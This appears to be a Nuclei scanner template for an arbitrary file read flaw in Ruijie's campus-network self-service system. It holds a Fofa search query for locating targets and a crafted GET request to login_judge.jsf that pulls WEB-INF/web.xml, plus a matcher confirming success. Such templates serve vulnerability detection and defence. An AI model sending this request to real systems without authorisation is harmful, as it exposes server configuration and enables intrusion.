id: Ruijie_RG_SAM_login_judge_Fileread

info:
  name: Ruijie_RG_SAM_login_judge_Fileread
  author: HK
  severity: high
  description: 锐捷校园网自助服务系统/selfservice/selfservice/module/scgroup/web/login_judge.jsf 接口存在任意文件读取漏洞
  metadata:
    max-request: 1
    Fofa-query: body="校园网自助服务系统"
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /selfservice/selfservice/module/scgroup/web/login_judge.jsf?view=./WEB-INF/web.xml%3F HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
    Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
    Accept-Encoding: gzip, deflate, br
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
        - param-value